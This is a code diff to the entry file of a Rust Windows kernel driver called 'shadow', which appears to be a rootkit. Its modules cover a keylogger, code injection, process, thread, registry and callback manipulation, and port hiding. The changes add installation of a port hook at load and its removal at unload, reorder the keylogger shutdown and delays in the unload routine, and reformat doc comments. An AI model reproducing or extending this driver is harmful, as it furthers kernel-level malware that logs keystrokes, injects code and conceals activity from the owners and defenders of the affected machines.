@@ -7,11 +7,12 @@ extern crate alloc;
 
 use {
     utils::uni,
+    port::Port,
+    core::ptr::null_mut, 
     kernel_log::KernelLogger,
-    core::ptr::null_mut,
-    wdk_sys::{_MODE::KernelMode, ntddk::*, *},
-    misc::keylogger::{SHUTDOWN, keylogger},
-    crate::utils::ioctls::IOCTL_MAP,
+    crate::utils::ioctls::IOCTL_MAP, 
+    misc::keylogger::{keylogger, SHUTDOWN}, 
+    wdk_sys::{ntddk::*, _MODE::KernelMode, *}
 };
 
 #[cfg(not(feature = "mapper"))]
@@ -22,17 +23,17 @@ use {
 };
 
 #[cfg(not(feature = "mapper"))]
-mod registry;
-mod callback;
-mod misc;
-mod driver;
-mod includes;
-mod process;
-mod thread;
-mod module;
-mod injection;
-mod port;
-mod utils;
+pub mod registry;
+pub mod callback;
+pub mod misc;
+pub mod driver;
+pub mod internals;
+pub mod process;
+pub mod thread;
+pub mod module;
+pub mod injection;
+pub mod port;
+pub mod utils;
 
 /// The name of the device in the device namespace.
 const DEVICE_NAME: &str = "\\Device\\shadow";
@@ -45,10 +46,12 @@ const DOS_DEVICE_NAME: &str = "\\??\\shadow";
 /// This function is called by the system when the driver is loaded.
 ///
 /// # Parameters
+/// 
 /// - `driver_object`: Pointer to the driver object.
 /// - `registry_path`: Pointer to the Unicode string that specifies the driver's registry path.
 ///
-/// # Return
+/// # Returns
+/// 
 /// - `NTSTATUS`: Status code indicating the success or failure of the operation.
 ///
 /// Reference: WDF expects a symbol with the name DriverEntry
@@ -58,11 +61,9 @@ pub unsafe extern "system" fn driver_entry(
     registry_path: PCUNICODE_STRING,
 ) -> NTSTATUS {
     KernelLogger::init(log::LevelFilter::Info).expect("Failed to initialize logger");
-
-    log::info!("DriverEntry Loaded");
     
     #[cfg(feature = "mapper")] {
-        use includes::IoCreateDriver;
+        use internals::IoCreateDriver;
 
         const DRIVER_NAME: &str = "\\Driver\\shadow";
         let mut driver_name = uni::str_to_unicode(DRIVER_NAME).to_unicode();
@@ -82,10 +83,12 @@ pub unsafe extern "system" fn driver_entry(
 /// initializing the driver, creating the device object and setting up the symbolic link.
 ///
 /// # Parameters
+/// 
 /// - `driver_object`: Pointer to the driver object.
 /// - `_registry_path`: Pointer to the Unicode string that specifies the driver's registry path.
 ///
-/// # Return
+/// # Returns
+/// 
 /// - `NTSTATUS`: Status code indicating the success or failure of the operation.
 /// 
 pub unsafe extern "system" fn shadow_entry(
@@ -155,6 +158,8 @@ pub unsafe extern "system" fn shadow_entry(
         }
     }
 
+    let status = unsafe { Port::install_hook() };
+
     STATUS_SUCCESS
 }
 
@@ -163,10 +168,12 @@ pub unsafe extern "system" fn shadow_entry(
 /// This function is responsible for processing IOCTL commands received by the driver and executing the corresponding actions.
 ///
 /// # Parameters
+/// 
 /// - `_device`: Pointer to the device object (not used in this function).
 /// - `irp`: Pointer to the I/O request packet (IRP) that contains the information about the device control request.
 ///
-/// # Return
+/// # Returns
+/// 
 /// - `NTSTATUS`: Status code indicating the success or failure of the operation.
 /// 
 pub unsafe extern "C" fn device_control(_device: *mut DEVICE_OBJECT, irp: *mut IRP) -> NTSTATUS {
@@ -191,10 +198,12 @@ pub unsafe extern "C" fn device_control(_device: *mut DEVICE_OBJECT, irp: *mut I
 /// It marks the I/O request (IRP) as successfully completed.
 ///
 /// # Parameters
+/// 
 /// - `_device_object`: Pointer to the associated device object (not used in this function).
 /// - `irp`: Pointer to the I/O request packet (IRP) containing the information about the close request.
 ///
-/// # Return
+/// # Returns
+/// 
 /// - `NTSTATUS`: Status code indicating the success of the operation (always returns `STATUS_SUCCESS`).
 ///
 pub unsafe extern "C" fn driver_close(_device_object: *mut DEVICE_OBJECT, irp: *mut IRP) -> NTSTATUS {
@@ -210,16 +219,28 @@ pub unsafe extern "C" fn driver_close(_device_object: *mut DEVICE_OBJECT, irp: *
 /// It removes the symbolic link and deletes the device object associated with the driver.
 ///
 /// # Parameters
+/// 
 /// - `driver_object`: Pointer to the driver object being unloaded.
 ///
 pub unsafe extern "C" fn driver_unload(driver_object: *mut DRIVER_OBJECT) {
     log::info!("Unloading driver");
 
+    SHUTDOWN = true;
+    
+    let hook_status = Port::uninstall_hook();
+    if !NT_SUCCESS(hook_status) {
+        log::error!("Failed to uninstall hook before unload");
+    }
+
+    let mut interval = LARGE_INTEGER {
+        QuadPart: -50 * 1000_i64 * 1000_i64,
+    };
+
+    KeDelayExecutionThread(KernelMode as i8, 0, &mut interval);
+
     let dos_device_name = uni::str_to_unicode(DOS_DEVICE_NAME);
     IoDeleteSymbolicLink(&mut dos_device_name.to_unicode());
     IoDeleteDevice((*driver_object).DeviceObject);
-
-    SHUTDOWN = true;
 
     #[cfg(not(feature = "mapper"))] {
         ObUnRegisterCallbacks(process::CALLBACK_REGISTRATION_HANDLE_PROCESS);
@@ -228,7 +249,7 @@ pub unsafe extern "C" fn driver_unload(driver_object: *mut DRIVER_OBJECT) {
     }
 
     let mut interval = LARGE_INTEGER {
-        QuadPart: -1 * -(50 * 10000_i64),
+        QuadPart: -1 * -(50 * 1000_i64),
     };
 
     KeDelayExecutionThread(KernelMode as i8, 0, &mut interval);
@@ -239,9 +260,11 @@ pub unsafe extern "C" fn driver_unload(driver_object: *mut DRIVER_OBJECT) {
 /// Register Callbacks.
 ///
 /// # Parameters
+/// 
 /// - `driver_object`: Pointer to the driver object being unloaded.
 /// 
-/// # Return
+/// # Returns
+/// 
 /// - `NTSTATUS`: Status code indicating the success of the operation (always returns `STATUS_SUCCESS`).
 ///
 #[cfg(not(feature = "mapper"))]
